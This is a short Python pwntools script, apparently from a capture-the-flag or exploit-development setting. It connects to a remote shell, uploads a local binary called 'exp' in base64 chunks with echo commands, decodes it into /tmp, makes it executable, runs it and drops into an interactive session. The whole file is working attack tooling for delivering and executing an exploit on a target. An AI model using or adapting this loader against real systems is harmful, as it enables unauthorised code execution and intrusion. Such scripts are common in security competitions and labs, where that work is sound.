from pwn import *
from tqdm import tqdm
import base64
# context.log_level = "debug"

PART = 0x200

with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())

prompt = b"$"
ip, port = "127.0.0.1", 8888
p = remote(ip, port)
try_count = 1
while True:
    log.info("upload the exp")
    count = 0
    for i in tqdm(range(0, len(exp), PART), desc="Uploading"):
        p.sendlineafter(prompt, b'echo -n "' + exp[i : i + PART] + b'" >> /tmp/b64_exp')
        count += 1
        # log.info("count: " + str(count))

    log.success("exp has been transfered successfully")
    p.sendlineafter(prompt, b"cat /tmp/b64_exp | base64 -d > /tmp/exp")
    p.sendlineafter(prompt, b"chmod +x /tmp/exp")
    log.info("prepare to run the exp...")
    p.sendlineafter(prompt, b"/tmp/exp")
    break

p.interactive()
